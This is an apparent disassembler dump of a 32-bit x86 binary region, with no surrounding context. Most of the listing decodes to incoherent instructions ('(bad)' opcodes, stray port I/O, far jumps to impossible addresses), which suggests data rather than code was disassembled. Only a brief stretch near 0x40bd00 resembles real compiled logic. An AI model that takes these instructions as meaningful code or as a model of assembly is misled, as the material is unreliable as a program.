  40b9a8:	mov    ss,WORD PTR [edi+0x78]
  40b9ab:	inc    esi
  40b9ac:	mov    ah,0x43
  40b9ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9af:	mov    ebp,0xb3ed3332
  40b9b4:	add    edx,DWORD PTR [edx]
  40b9b6:	mov    dl,0xe8
  40b9b8:	sub    eax,0x17193aab
  40b9bd:	adc    al,0x80
  40b9bf:	mov    edx,0x6518a96d
  40b9c4:	push   ebp
  40b9c5:	test   BYTE PTR [edi],dl
  40b9c7:	ins    BYTE PTR es:[edi],dx
  40b9c8:	sbb    cl,BYTE PTR ds:[eax]
  40b9cb:	imul   eax,DWORD PTR [ebp-0x7b],0xffffff95
  40b9cf:	fsubrp st(6),st
  40b9d1:	dec    edx
  40b9d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9d3:	sub    esi,esp
  40b9d5:	out    dx,al
  40b9d6:	ror    BYTE PTR [edx],cl
  40b9d8:	sbb    eax,0x14cde489
  40b9dd:	(bad)  
  40b9de:	mov    al,ds:0xf3bfad27
  40b9e3:	cli    
  40b9e4:	lahf   
  40b9e5:	mov    DWORD PTR [edi+0x7b],0x76d772ec
  40b9ec:	push   ss
  40b9ed:	das    
  40b9ee:	add    al,0x86
  40b9f0:	cmc    
  40b9f1:	pop    ebx
  40b9f2:	rol    DWORD PTR [ecx-0x336f8988],0xb3
  40b9f9:	ins    BYTE PTR es:[edi],dx
  40b9fa:	push   ss
  40b9fb:	fidiv  DWORD PTR [eax-0x5]
  40b9fe:	cwde   
  40b9ff:	jne    0x40b9ef
  40ba01:	mov    es,WORD PTR [esi]
  40ba03:	sar    DWORD PTR [ebx+0x2772626b],cl
  40ba09:	fisubr DWORD PTR [edx-0x66]
  40ba0c:	outs   dx,BYTE PTR ds:[esi]
  40ba0d:	dec    esi
  40ba0e:	hlt    
  40ba0f:	fimul  WORD PTR [ecx]
  40ba11:	xlat   BYTE PTR ds:[ebx]
  40ba12:	cmc    
  40ba13:	pop    ebx
  40ba14:	inc    edx
  40ba15:	dec    ebp
  40ba16:	test   eax,0x7367d1d
  40ba1b:	fwait
  40ba1c:	ret    
  40ba1d:	xchg   edx,eax
  40ba1e:	(bad)  
  40ba1f:	and    ah,BYTE PTR [ebp+0x6e]
  40ba22:	add    eax,0xcbc9ef77
  40ba27:	jp     0x40ba7e
  40ba29:	xchg   edi,eax
  40ba2a:	and    dh,BYTE PTR [ecx+eiz*4-0x64]
  40ba2e:	into   
  40ba2f:	pop    eax
  40ba30:	repnz mov esp,0xdec5359a
  40ba36:	rcl    BYTE PTR [edx+edx*1-0x65],cl
  40ba3a:	inc    BYTE PTR [edx+ecx*1-0x549e2111]
  40ba41:	(bad)  
  40ba42:	pop    esi
  40ba43:	int3   
  40ba44:	sub    al,BYTE PTR [ecx]
  40ba46:	jl     0x40ba0e
  40ba48:	rcr    edx,cl
  40ba4a:	mov    edx,0x6fdcf5b5
  40ba4f:	mov    esp,0x91b22eef
  40ba54:	std    
  40ba55:	adc    eax,0x6f0267ae
  40ba5a:	and    BYTE PTR [ebx-0xc930c50],ch
  40ba60:	push   eax
  40ba61:	(bad)  
  40ba62:	and    eax,esp
  40ba64:	lods   eax,DWORD PTR ds:[esi]
  40ba65:	add    DWORD PTR [eax-0x21],eax
  40ba68:	jne    0x40bac7
  40ba6a:	les    edi,FWORD PTR [esi-0xa29d0a1]
  40ba70:	inc    ecx
  40ba71:	add    DWORD PTR [eax],0xfffffffd
  40ba74:	les    ecx,FWORD PTR [ebx]
  40ba76:	je     0x40baba
  40ba78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba79:	dec    eax
  40ba7a:	hlt    
  40ba7b:	xchg   edx,eax
  40ba7c:	int3   
  40ba7d:	jle    0x40bae9
  40ba7f:	adc    ebx,DWORD PTR [ecx]
  40ba81:	lods   eax,DWORD PTR ds:[esi]
  40ba82:	pop    ds
  40ba83:	inc    ecx
  40ba84:	dec    edx
  40ba85:	outs   dx,BYTE PTR ds:[esi]
  40ba86:	retf   0x9517
  40ba89:	inc    ebx
  40ba8a:	fistp  WORD PTR [ebx]
  40ba8c:	push   DWORD PTR [ecx]
  40ba8e:	test   DWORD PTR [ebx-0x2c],ebx
  40ba91:	mov    dl,0x39
  40ba93:	push   eax
  40ba94:	sbb    BYTE PTR [ebx+ebx*2-0x5c395def],0xa8
  40ba9c:	sahf   
  40ba9d:	shr    ch,1
  40ba9f:	pop    eax
  40baa0:	clc    
  40baa1:	retfw  
  40baa3:	inc    edx
  40baa4:	xchg   esp,eax
  40baa5:	scas   al,BYTE PTR es:[edi]
  40baa6:	mov    edx,0xb23ecf57
  40baab:	adc    ah,cl
  40baad:	sbb    edx,DWORD PTR [ecx-0x773a23c7]
  40bab3:	out    dx,eax
  40bab4:	cmp    al,0x35
  40bab6:	nop
  40bab7:	push   ecx
  40bab8:	fwait
  40bab9:	cdq    
  40baba:	jbe    0x40ba9a
  40babc:	nop
  40babd:	sbb    BYTE PTR [edi+0x4a],cl
  40bac0:	mov    dh,0x54
  40bac2:	lds    esp,FWORD PTR [ebp+ebx*4-0x23]
  40bac6:	push   esp
  40bac7:	pop    edx
  40bac8:	jbe    0x40ba81
  40baca:	push   0x5d2876e5
  40bacf:	test   ecx,ebp
  40bad1:	xchg   esi,eax
  40bad2:	mov    bl,0x37
  40bad4:	adc    al,0x32
  40bad6:	fimul  DWORD PTR gs:[eax-0x73]
  40bada:	(bad)  
  40badb:	xchg   ecx,eax
  40badc:	ss daa 
  40bade:	int    0xce
  40bae0:	mov    ebp,0xf0ba608f
  40bae5:	mov    al,ds:0xcb6cba46
  40baea:	shl    ebp,cl
  40baec:	stos   BYTE PTR es:[edi],al
  40baed:	pop    ecx
  40baee:	sub    al,0xfe
  40baf0:	mov    bl,0xf9
  40baf2:	inc    edx
  40baf3:	mov    DWORD PTR [edi+0x28],ebp
  40baf6:	aaa    
  40baf7:	cmp    eax,0xf1623fc2
  40bafc:	inc    edi
  40bafd:	das    
  40bafe:	dec    edi
  40baff:	int3   
  40bb00:	lods   al,BYTE PTR ds:[esi]
  40bb01:	shl    ch,cl
  40bb03:	pop    ds
  40bb04:	outs   dx,DWORD PTR ds:[esi]
  40bb05:	add    BYTE PTR [edx+edx*4+0x3e],0xb9
  40bb0a:	xor    al,0x79
  40bb0c:	in     al,dx
  40bb0d:	add    BYTE PTR [edi],dh
  40bb0f:	mov    ebx,ebx
  40bb11:	icebp  
  40bb12:	aas    
  40bb13:	test   al,ch
  40bb15:	ftst   
  40bb17:	dec    esp
  40bb18:	mov    bh,0x23
  40bb1a:	pop    esp
  40bb1b:	fidiv  WORD PTR [edi]
  40bb1d:	sbb    dl,ch
  40bb1f:	out    0xe8,eax
  40bb21:	lds    ebp,FWORD PTR [edx+0x203bed79]
  40bb27:	xchg   ebx,eax
  40bb28:	imul   edx,DWORD PTR [edi+0x47b3b8bf],0xffffffdb
  40bb2f:	retf   
  40bb30:	inc    esi
  40bb31:	mov    al,ds:0x88f11b
  40bb36:	push   edi
  40bb37:	mov    ebx,0x48ea9261
  40bb3c:	sbb    DWORD PTR [ebx+eiz*8-0x62],esp
  40bb40:	jp     0x40bb09
  40bb42:	sub    bl,BYTE PTR [ebp-0x76e36e82]
  40bb48:	div    bl
  40bb4a:	ins    BYTE PTR es:[edi],dx
  40bb4b:	popf   
  40bb4c:	fdiv   QWORD PTR [ebp+0x45c54c6c]
  40bb52:	int3   
  40bb53:	fcomp  QWORD PTR ds:0xb6de5509
  40bb59:	jmp    0xeb9e:0xfb500c3c
  40bb60:	and    DWORD PTR [esi],eax
  40bb62:	(bad)  
  40bb64:	and    edx,DWORD PTR [edx-0x25]
  40bb67:	clc    
  40bb68:	sbb    DWORD PTR [ecx],0x63bac892
  40bb6e:	cmp    cl,ah
  40bb70:	out    dx,eax
  40bb71:	sub    al,0xd1
  40bb73:	lods   eax,DWORD PTR es:[esi]
  40bb75:	inc    esi
  40bb76:	inc    ebx
  40bb77:	out    dx,eax
  40bb78:	js     0x40bb9d
  40bb7a:	into   
  40bb7b:	(bad)  
  40bb7d:	adc    edx,DWORD PTR [eax]
  40bb7f:	mov    al,ds:0x67038a67
  40bb84:	popa   
  40bb85:	mov    ah,0xd7
  40bb87:	mov    edx,0x58fb7810
  40bb8c:	sub    edx,DWORD PTR [ebp+0xb]
  40bb8f:	(bad)  
  40bb90:	in     al,0x58
  40bb92:	(bad)  
  40bb96:	jecxz  0x40bc07
  40bb98:	lea    ebp,[esi+0x4d]
  40bb9b:	mov    eax,ds:0xa945be9a
  40bba0:	ja     0x40bbca
  40bba2:	imul   esi,eax,0xb5819bea
  40bba8:	mov    BYTE PTR [edx+0x36],bh
  40bbab:	adc    esp,DWORD PTR [eax]
  40bbad:	sub    eax,0xec11d263
  40bbb2:	jecxz  0x40bc01
  40bbb4:	js     0x40bb81
  40bbb6:	push   esi
  40bbb7:	loopne 0x40bc19
  40bbb9:	xor    al,0x92
  40bbbb:	lds    eax,FWORD PTR [ebx-0x27]
  40bbbe:	call   0x69ff:0x99fbc54
  40bbc5:	push   esp
  40bbc6:	mov    bh,0x35
  40bbc8:	aas    
  40bbc9:	fbstp  TBYTE PTR [ecx+0x2d0e4e6]
  40bbcf:	sub    DWORD PTR [ecx-0x4],0xffffffe2
  40bbd3:	jbe    0x40bc18
  40bbd5:	out    0xb,eax
  40bbd7:	cs test al,0xfe
  40bbda:	push   ebp
  40bbdb:	pop    edi
  40bbdc:	add    ch,BYTE PTR [ebp+0x31]
  40bbdf:	test   al,0xb4
  40bbe1:	cwde   
  40bbe2:	add    al,0x41
  40bbe4:	cmp    esi,DWORD PTR [ebx-0x2e626adb]
  40bbea:	push   ebp
  40bbeb:	jp     0x40bb76
  40bbed:	dec    ebx
  40bbee:	mov    ebp,0x241232de
  40bbf3:	bound  esi,QWORD PTR [edx-0x45]
  40bbf6:	inc    edi
  40bbf7:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40bbf9:	cmp    eax,DWORD PTR fs:0xf58ae887
  40bc00:	ficom  WORD PTR [edi]
  40bc02:	std    
  40bc03:	outs   dx,DWORD PTR ds:[esi]
  40bc04:	cdq    
  40bc05:	or     eax,0xc70069eb
  40bc0a:	cdq    
  40bc0b:	mov    ds:0xe006ab00,al
  40bc10:	lods   eax,DWORD PTR ds:[esi]
  40bc11:	mov    al,al
  40bc13:	cmc    
  40bc14:	adc    DWORD PTR [esi+eax*8+0x74],0x758f1e
  40bc1c:	add    eax,0x68d3d002
  40bc21:	loopne 0x40bc01
  40bc23:	push   esi
  40bc24:	xchg   esp,eax
  40bc25:	jmp    0x5a5d:0xbe4265af
  40bc2c:	repnz (bad) 
  40bc2e:	fs inc ebp
  40bc30:	adc    eax,DWORD PTR [esi]
  40bc32:	aaa    
  40bc33:	xor    dl,ah
  40bc35:	daa    
  40bc36:	mov    ch,0x82
  40bc38:	mov    ds:0x8f432a0b,al
  40bc3d:	xor    al,0x68
  40bc3f:	retf   0x21a5
  40bc42:	arpl   WORD PTR [eax],di
  40bc44:	pusha  
  40bc45:	sbb    al,0x5a
  40bc47:	sub    al,0x4d
  40bc49:	imul   esi,DWORD PTR [eax],0xffffffab
  40bc4c:	add    edi,0x16
  40bc4f:	dec    ebp
  40bc50:	lock arpl WORD PTR [edx+0x2],sp
  40bc54:	xor    ebp,ecx
  40bc56:	jmp    0xddc6a00b
  40bc5b:	enter  0x9f1a,0x49
  40bc5f:	inc    esi
  40bc60:	mov    al,ds:0xccd9441f
  40bc65:	outs   dx,BYTE PTR ds:[esi]
  40bc66:	or     eax,0x32657315
  40bc6b:	add    al,0xeb
  40bc6d:	cdq    
  40bc6e:	test   DWORD PTR [ebp+0x44],ebp
  40bc71:	cmp    eax,eax
  40bc73:	lds    ebp,FWORD PTR gs:0x792cb3f1
  40bc7a:	jmp    0x9d7334e1
  40bc7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc80:	ja     0x40bc02
  40bc82:	xchg   ebx,eax
  40bc83:	sub    DWORD PTR [eax],ecx
  40bc85:	mov    ebx,0x75cdc758
  40bc8a:	push   0x5b
  40bc8c:	push   ss
  40bc8d:	hlt    
  40bc8e:	and    dl,bl
  40bc90:	rol    ebp,1
  40bc92:	retf   0xc08c
  40bc95:	je     0x40bcb9
  40bc97:	cmp    BYTE PTR [esi],al
  40bc99:	adc    al,0x31
  40bc9b:	jo     0x40bcc2
  40bc9d:	in     al,0xcf
  40bc9f:	mov    bh,0x2
  40bca1:	push   es
  40bca2:	stos   DWORD PTR es:[edi],eax
  40bca3:	pop    ds
  40bca4:	jge    0x40bcd9
  40bca6:	mov    edi,0xfe6ca6f1
  40bcab:	sbb    eax,0xea41908e
  40bcb0:	pop    esp
  40bcb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcb2:	repz jl 0x40bc3c
  40bcb5:	jg     0x40bc60
  40bcb7:	int3   
  40bcb8:	or     ebx,DWORD PTR [ebx]
  40bcba:	add    al,BYTE PTR ds:0x651eee
  40bcc0:	push   esi
  40bcc1:	imul   esi,DWORD PTR [ebp+eax*8-0x2],0x923d1a6f
  40bcc9:	xchg   ecx,eax
  40bcca:	jbe    0x40bca1
  40bccc:	iret   
  40bccd:	retf   0xc71a
  40bcd0:	sti    
  40bcd1:	inc    eax
  40bcd2:	jl     0x40bc89
  40bcd4:	lods   al,BYTE PTR ds:[esi]
  40bcd5:	in     eax,dx
  40bcd6:	and    ebp,DWORD PTR [ecx+0x2b718e96]
  40bcdc:	inc    ebp
  40bcdd:	mov    bh,0x78
  40bcdf:	ss mov esi,0x36a8d4a1
  40bce5:	repnz popf 
  40bce7:	sbb    edx,0xffffff9c
  40bcea:	and    cl,BYTE PTR [ebp+0x3f]
  40bced:	shr    DWORD PTR [ebp-0x10],1
  40bcf0:	pop    edi
  40bcf1:	mov    al,ds:0x5d8b1221
  40bcf6:	lock sub ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    bh,BYTE PTR [ebx]
  40bd3f:	or     DWORD PTR [edx+0x70],edx
  40bd42:	(bad)  
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd7e
  40bd4b:	xor    BYTE PTR [ecx+ebp*8-0x4f99f84f],0xc9
  40bd53:	pop    ecx
  40bd54:	mul    edx
  40bd56:	cmovnp ebx,DWORD PTR [eax]
  40bd59:	(bad)  
  40bd5a:	add    ebx,DWORD PTR [ecx]
  40bd5c:	jne    0x40bd4c
  40bd5e:	jne    0x40bdc3
  40bd60:	jne    0x40bd2a
  40bd62:	adc    ch,BYTE PTR ds:0xd446cecc
  40bd68:	(bad)  
  40bd69:	dec    edx
  40bd6a:	xchg   ebp,eax
  40bd6b:	out    dx,al
  40bd6c:	sbb    eax,0x3f92a43f
  40bd71:	add    BYTE PTR [ecx+edx*4+0x65a17ebd],bl
  40bd78:	repz pusha 
  40bd7a:	dec    esp
  40bd7b:	adc    DWORD PTR [ebx+0x37],0x2d2f77a8
  40bd82:	out    dx,al
  40bd83:	mov    BYTE PTR [eax-0x24],0x85
  40bd87:	lahf   
  40bd88:	add    ebp,esi
  40bd8a:	dec    esi
  40bd8b:	call   0x39bc50f7
  40bd90:	inc    ecx
  40bd91:	sbb    al,0xe9
  40bd93:	sbb    edi,DWORD PTR [edx-0x7b4eb881]
  40bd99:	jge    0x40be0a
  40bd9b:	add    BYTE PTR [eax+0x344b195b],cl
  40bda1:	adc    ebx,ecx
  40bda3:	mov    edi,0xcb541056
  40bda8:	and    DWORD PTR [ebp+0x5d],0xffffffd2
  40bdac:	inc    eax
  40bdad:	pop    edi
  40bdae:	stc    
  40bdaf:	into   
  40bdb0:	cli    
  40bdb1:	cmp    ebp,DWORD PTR [ebp-0x14]
  40bdb4:	cwde   
  40bdb5:	dec    eax
  40bdb6:	mov    edx,0x33b61abf
  40bdbb:	hlt    
  40bdbc:	mov    esi,0x9d8e27f8
  40bdc1:	sub    cl,BYTE PTR ss:[edx+0x1b5dbd24]
  40bdc8:	int3   
  40bdc9:	fsubr  st(2),st
  40bdcb:	in     al,0xc7
  40bdcd:	mov    esi,0x989edd5f
  40bdd2:	and    BYTE PTR [eax],ch
  40bdd4:	cmp    ecx,ebx
  40bdd6:	sbb    al,0xd3
  40bdd8:	aaa    
  40bdd9:	mov    dh,0x5f
  40bddb:	dec    ecx
  40bddc:	xlat   BYTE PTR ds:[ebx]
  40bddd:	push   ebx
  40bdde:	mov    esp,0x81e2dcd1
  40bde3:	aaa    
  40bde4:	test   eax,0xfebcdc7d
  40bde9:	jl     0x40bdcb
  40bdeb:	jmp    0x1379:0xecbe9ef4
  40bdf2:	es stos DWORD PTR es:[edi],eax
  40bdf4:	push   esp
  40bdf5:	mov    eax,0xcae65687
  40bdfa:	cmp    ch,dl
  40bdfc:	push   ebp
  40bdfd:	mov    bl,dl
  40bdff:	not    DWORD PTR [edx]
  40be01:	mov    edi,0x97052df3
  40be06:	rcr    DWORD PTR [esi],1
  40be08:	jle    0x40be3f
  40be0a:	jo     0x40bdb0
  40be0c:	jmp    0x40be0c
  40be0e:	hlt    
  40be0f:	lods   eax,DWORD PTR ds:[esi]
  40be10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be11:	xchg   BYTE PTR [edx+eiz*4+0x43],dl
  40be15:	xchg   ecx,eax
  40be16:	push   cs
  40be17:	mov    esi,0xef03f07
  40be1c:	cmp    cl,BYTE PTR [esi]
  40be1e:	mov    ch,0x8e
  40be20:	pop    eax
  40be21:	sub    eax,0x133235c
  40be26:	sti    
  40be27:	sar    DWORD PTR [edi-0x35487c62],1
  40be2d:	mov    eax,DWORD PTR [edi+0x43]
  40be30:	daa    
  40be31:	push   edi
  40be32:	cmp    al,0xca
  40be34:	push   ds
  40be35:	mov    dh,0xdd
  40be37:	inc    edx
  40be38:	pushf  
  40be39:	in     al,0xba
  40be3b:	adc    edi,DWORD PTR [esi+0x667ac68d]
  40be41:	shr    DWORD PTR [ebx+0x10816bad],1
  40be47:	add    esp,DWORD PTR [eax+0x6e51bbb3]
  40be4d:	push   edi
  40be4e:	pop    esi
  40be4f:	(bad)  
  40be50:	fadd   QWORD PTR [eax+0x231256a7]
  40be56:	into   
  40be57:	scas   al,BYTE PTR es:[edi]
  40be58:	out    dx,al
  40be59:	inc    eax
  40be5a:	cdq    
  40be5b:	xchg   esi,eax
  40be5c:	sub    eax,0x396ed87
  40be61:	das    
  40be62:	mov    dh,0x6b
  40be64:	mov    eax,0x4354d04b
  40be69:	std    
  40be6a:	inc    esp
  40be6b:	dec    esp
  40be6c:	cld    
  40be6d:	inc    ebp
  40be6e:	(bad)  
  40be6f:	jmp    ebx
  40be71:	stos   DWORD PTR es:[edi],eax
  40be72:	enter  0x5cda,0x39
  40be76:	and    eax,ecx
  40be78:	xor    BYTE PTR [eax],bl
  40be7a:	adc    DWORD PTR [edx-0x711bc32c],edi
  40be80:	sahf   
  40be81:	xor    al,BYTE PTR [ebx+ebp*1-0x14d78e99]
  40be88:	push   es
  40be89:	pop    ds
  40be8a:	jns    0x40be2f
  40be8c:	or     BYTE PTR [ecx+0x224fcf51],bh
  40be92:	retf   
  40be93:	adc    bl,dl
  40be95:	xor    edi,DWORD PTR [edx+ebp*2]
  40be98:	sub    DWORD PTR [ebp+eiz*4-0x63e517e9],esi
  40be9f:	mov    eax,0x5ddb6e
  40bea4:	data16 icebp 
  40bea6:	mov    al,ds:0xe6bc0a2b
  40beab:	pop    es
  40beac:	mov    edi,0x533b2946
  40beb1:	jno    0x40be4d
  40beb3:	lods   al,BYTE PTR ds:[esi]
  40beb4:	popf   
  40beb5:	or     edi,DWORD PTR [ecx+0x12]
  40beb8:	pop    ebp
  40beb9:	lds    ecx,FWORD PTR [esi-0x2e3b6cbe]
  40bebf:	js     0x40be86
  40bec1:	xlat   BYTE PTR ds:[ebx]
  40bec2:	dec    ebp
  40bec3:	call   0xe968:0x9dbec115
  40beca:	(bad)  
  40becc:	mov    al,0xb1
  40bece:	inc    ebx
  40becf:	dec    edx
  40bed0:	daa    
  40bed1:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bed3:	sbb    BYTE PTR ds:0x46c06665,ch
  40bed9:	xchg   ecx,eax
  40beda:	ins    DWORD PTR es:[edi],dx
  40bedb:	dec    edi
  40bedc:	pop    edx
  40bedd:	mov    ecx,0xf2187407
  40bee2:	ret    
  40bee3:	sub    eax,0x29e4854a
  40bee8:	arpl   WORD PTR [eax],bp
  40beea:	mov    fs,WORD PTR [edx]
  40beec:	xor    BYTE PTR [ecx+0xd],dl
  40beef:	out    0x7,al
  40bef1:	popf   
  40bef2:	int    0x3d
  40bef4:	repnz daa 
  40bef6:	cwde   
  40bef7:	jmp    0x2fa75e25
  40befc:	or     DWORD PTR [esp+ebx*8+0x2d],esp
  40bf00:	cmp    edi,DWORD PTR [ecx]
  40bf02:	imul   eax,DWORD PTR [ebx],0xffffffed
  40bf05:	push   ebp
  40bf06:	cs ss cwde 
  40bf09:	ss test al,0x3a
  40bf0c:	jle    0x40bea3
  40bf0e:	xchg   ebp,eax
  40bf0f:	jbe    0x40bf58
  40bf11:	imul   esp,DWORD PTR [edx],0x2ae9e1ef
  40bf17:	stos   DWORD PTR es:[edi],eax
  40bf18:	jns    0x40bf54
  40bf1a:	adc    esi,DWORD PTR [edx]
  40bf1c:	out    dx,eax
  40bf1d:	push   ecx
  40bf1e:	sub    ch,BYTE PTR [ebx+0x7a723659]
  40bf24:	fiadd  DWORD PTR [esp+edi*1-0x7a]
  40bf28:	shl    ah,cl
  40bf2a:	pop    es
  40bf2b:	into   
  40bf2c:	sub    bh,BYTE PTR [esi+0x52]
  40bf2f:	pushf  
  40bf30:	mov    edx,eax
  40bf32:	adc    DWORD PTR [edx],ecx
  40bf34:	and    dl,0x9b
  40bf37:	pop    ebp
  40bf38:	out    dx,eax
  40bf39:	out    dx,eax
  40bf3a:	push   ecx
  40bf3b:	inc    ecx
  40bf3c:	shl    BYTE PTR [ebx+0x7e],1
  40bf3f:	lods   al,BYTE PTR ds:[esi]
  40bf40:	int    0xc4
  40bf42:	dec    ebx
  40bf43:	mov    al,ds:0x2ce2837b
  40bf48:	pop    edi
  40bf49:	mov    ebx,0x393196b0
  40bf4e:	aad    0xb6
  40bf50:	cld    
  40bf51:	mov    edi,0x486ae889
  40bf56:	adc    cl,BYTE PTR [eax+0x36]
  40bf59:	stos   BYTE PTR es:[edi],al
  40bf5a:	mov    ds:0x8254f538,al
  40bf5f:	in     al,dx
  40bf60:	jne    0x40bf45
  40bf62:	clc    
  40bf63:	sbb    DWORD PTR [ebx-0x42],edx
  40bf66:	ds inc esp
  40bf68:	dec    ebp
  40bf69:	mov    dl,0x43
  40bf6b:	mov    eax,ds:0x4be6dbca
  40bf70:	cmp    DWORD PTR [ebp+0x49],0x42
  40bf74:	cmp    eax,0xe7e88229
  40bf79:	scas   al,BYTE PTR es:[edi]
  40bf7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf7b:	mov    ds:0xc9c93d94,eax
  40bf80:	add    eax,0xb3faee30
  40bf85:	retf   0x7fac
  40bf88:	jecxz  0x40bffb
  40bf8a:	push   ebp
  40bf8b:	mov    dh,0x75
  40bf8d:	jmp    0x88ad:0xdd810a58
  40bf94:	add    dh,BYTE PTR [esi-0x8192f84]
  40bf9a:	push   ebp
  40bf9b:	mov    ds:0xfddbe528,eax
  40bfa0:	mov    edi,0x3a85321f
  40bfa5:	pop    esi
  40bfa6:	xchg   esi,eax
  40bfa7:	pop    esp
  40bfa8:	dec    esp
  40bfa9:	cmp    dl,al
  40bfab:	mov    DWORD PTR [edx],ecx
  40bfad:	ret    0xe7a2
  40bfb0:	pop    esi
  40bfb1:	out    dx,eax
  40bfb2:	je     0x40bff8
  40bfb4:	sbb    ebx,DWORD PTR [eax]
  40bfb6:	mov    ds:0xf3564d9f,eax
  40bfbb:	in     eax,0x68
  40bfbd:	pop    edx
  40bfbe:	pop    ebp
  40bfbf:	dec    edi
  40bfc0:	push   esi
  40bfc1:	retf   
  40bfc2:	fwait
  40bfc3:	sub    eax,0x2135ce03
  40bfc8:	in     al,0x48
  40bfca:	mov    eax,0x6006c004
  40bfcf:	out    dx,al
  40bfd0:	dec    esp
  40bfd1:	xor    DWORD PTR [ebp+0x68],eax
  40bfd4:	dec    esp
  40bfd5:	adc    ch,BYTE PTR [edx+0x7c]
  40bfd8:	mov    ecx,0xbc26011
  40bfdd:	(bad)  
  40bfde:	xor    ebx,ebx
  40bfe0:	xchg   esp,eax
  40bfe1:	fnsetpm(287 only) 
  40bfe3:	stos   BYTE PTR es:[edi],al
  40bfe4:	sbb    DWORD PTR [esi-0xe],edx
  40bfe7:	int3   
  40bfe8:	push   0xffffff8f
  40bfea:	adc    esi,DWORD PTR [esi+edx*1-0x7c]
  40bfee:	mov    dh,0x5
  40bff0:	push   esi
  40bff1:	mov    dh,BYTE PTR [edx+0x26a592fd]
  40bff7:	das    
  40bff8:	inc    ebx
  40bff9:	sub    al,0x7b
  40bffb:	push   DWORD PTR [ecx+0x23]
  40bffe:	mov    ch,0x6b
  40c000:	add    DWORD PTR [edx+0x6a],ebp
  40c003:	mov    ah,0xa
  40c005:	mov    esi,0xe7852cd9
  40c00a:	push   edx
  40c00b:	jge    0x40c060
  40c00d:	jp     0x40c068
  40c00f:	adc    BYTE PTR cs:[ebp+0x43f68cca],ah
  40c016:	jp     0x40bfde
  40c018:	in     al,dx
  40c019:	lock fs adc esi,eax
  40c01d:	sbb    edx,DWORD PTR [ebx+0x41]
  40c020:	push   es
  40c021:	aad    0x79
  40c023:	jnp    0x40c022
  40c025:	test   eax,0x42846b2a
  40c02a:	or     DWORD PTR [ebx+ebp*8-0x6bd6fe77],0x46
  40c032:	popa   
  40c033:	pop    ss
  40c034:	rol    dl,1
  40c036:	ret    
  40c037:	mov    edi,DWORD PTR [eax+0x65]
  40c03a:	mov    dl,0xb5
  40c03c:	out    dx,al
  40c03d:	leave  
  40c03e:	aas    
  40c03f:	add    bh,0x3f
  40c042:	jmp    0x40c03f
  40c044:	pop    esi
  40c045:	sti    
  40c046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c047:	xor    cl,BYTE PTR [ebx]
  40c049:	ja     0x40bfd6
  40c04b:	fcmovne st,st(3)
  40c04d:	inc    edx
  40c04e:	cmp    eax,0xd4c481a
  40c053:	enter  0x5a20,0x86
  40c057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c058:	jns    0x40c0b6
  40c05a:	(bad)  
  40c05c:	fst    DWORD PTR [ecx-0xd]
  40c05f:	call   0x6ab4:0xa32100a0
  40c066:	test   dh,dl
  40c068:	adc    al,0xec
  40c06a:	out    0x32,eax
  40c06c:	out    0xba,al
  40c06e:	jmp    0x7700a10
  40c073:	cmp    DWORD PTR [edi+0x1c],edi
  40c076:	pop    edi
  40c077:	xchg   DWORD PTR [eax+esi*8-0x1a0b6eb3],ebp
  40c07e:	fcom   QWORD PTR [edi+eax*2+0x1ec84797]
  40c085:	mov    dh,0x1d
  40c087:	push   esi
  40c088:	inc    ecx
  40c089:	inc    ecx
  40c08a:	fld    st(3)
  40c08c:	es jge 0x40c03a
  40c08f:	ret    
  40c090:	sub    al,0x41
  40c092:	inc    ebx
  40c093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c094:	xor    al,0x64
  40c096:	fidivr DWORD PTR [ebx-0x75f52a74]
  40c09c:	sub    BYTE PTR [ebp-0x67e2e03f],0x3e
  40c0a3:	cdq    
  40c0a4:	pop    edx
  40c0a5:	ret    
  40c0a6:	ja     0x40c033
  40c0a8:	add    BYTE PTR [ebp+eiz*2-0x145c3955],ch
  40c0af:	and    edx,esp
  40c0b1:	shr    DWORD PTR [ecx+eax*1+0x7fa37126],1
  40c0b8:	addr16 (bad) 
  40c0ba:	in     al,0x79
  40c0bc:	out    0xf9,al
  40c0be:	ret    0x1237
  40c0c1:	leave  
  40c0c2:	in     al,0x78
  40c0c4:	sbb    eax,0x62477803
  40c0c9:	inc    esi
  40c0ca:	adc    BYTE PTR [esi-0x67],ch
  40c0cd:	pop    ecx
  40c0ce:	cld    
  40c0cf:	cli    
  40c0d0:	xor    eax,0x8e2176a6
  40c0d5:	jle    0x40c0cf
  40c0d7:	stc    
  40c0d8:	mov    ah,0x4
  40c0da:	jb     0x40c0a1
  40c0dc:	and    BYTE PTR [edi-0x33],ch
  40c0df:	mov    edi,0x8d9189c7
  40c0e4:	out    0xdb,eax
